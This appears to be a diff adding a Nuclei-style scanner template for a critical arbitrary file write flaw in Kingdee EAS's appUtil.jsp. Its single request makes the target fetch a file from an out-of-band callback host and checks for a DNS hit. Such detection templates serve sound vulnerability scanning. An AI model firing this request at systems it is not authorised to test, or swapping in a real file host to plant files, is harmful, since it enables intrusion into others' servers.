@@ -1,0 +1,21 @@
+id: poc-kingdee-eas-apputil-downloadurl-upload
+info:
+  name: Kingdee EAS appUtil.jsp Arbitrary File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,arbitrary-write
+http:
+  - raw:
+      - |
+        GET /easportal/tools/appUtil.jsp?downloadUrl=http://{{interactsh-url}}/1.zip&type=1 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: status
+        status:
+          - 200
